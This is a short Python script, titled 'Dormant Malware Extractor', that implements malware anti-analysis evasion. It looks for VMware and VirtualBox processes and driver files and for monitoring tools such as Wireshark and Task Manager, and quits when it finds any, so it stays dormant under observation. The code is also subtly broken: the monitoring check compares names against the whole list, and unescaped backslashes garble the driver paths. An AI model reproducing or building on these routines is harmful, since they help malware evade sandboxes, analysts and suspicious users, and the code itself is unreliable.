##Dormant Malware Extractor##
import psutil, os
from psutil import AccessDenied

print("Scanning for known VirtualMachine Processes...\n")
##Virtualmachine Process detection##
virmach = ["vmsrvc.exe", "vmusrvc.exe", "vboxtray.exe", "vmtoolsd.exe", "df5serv.exe", "vboxservice.exe", "vmwareuser.exe", "vmwarytray.exe", "vmupgradehelper.exe", "vmtoolsd.exe", "vmacthlp.exe"]
for proc in psutil.process_iter():
	for processes in virmach:
		try:
			if proc.name().lower() == processes:
				print("Found Process %s...exiting\n" % proc.name())
				exit()
			else:
				print("not here %s" % proc.name())
		except AccessDenied:
			print("Couldn't read PID, Permission Error...\n")
		
print("Scnanning for VirtualMachine Drivers\n")
##Virtualmachine Driver and Wine Detection##
virpath = ["C:\windows\system32\drivers\vmci.sys", "C:\windows\system32\drivers\vmhgfs.sys", "C:\windows\system32\drivers\vmmouse.sys", "C:\windows\system32\drivers\vmscsi.sys", "C:\windows\system32\drivers\vmusbmouse.sys", "C:\windows\system32\drivers\vmx_svga.sys", "C:\windows\system32\drivers\vmxnet.sys", "C:\windows\system32\drivers\VBoxMouse.sys"]
for list1 in virpath:
	if os.path.exists(list1) == True:
		print("Found VM Driver...Exiting")
		exit()
	else:
		print("No VM Drivers detected\n")
		
##Anti-Monitoring##...Less important that VM and Sandbox because a regular user may just be suspicious of loss in system resources##
print("Checking if we are being monitored...\n")
monitor = ["wireshark.exe", "taskmgr.exe"]
for mproc in psutil.process_iter():
	for processes2 in monitor:
		try:
			if mproc.name().lower() == monitor:
				print("Found Process %s...exiting\n" % mproc.name())
				exit()
			else:
				print("not here %s" % mproc.name())
		except AccessDenied:
			print("Couldn't read PID, Permission Error...\n")
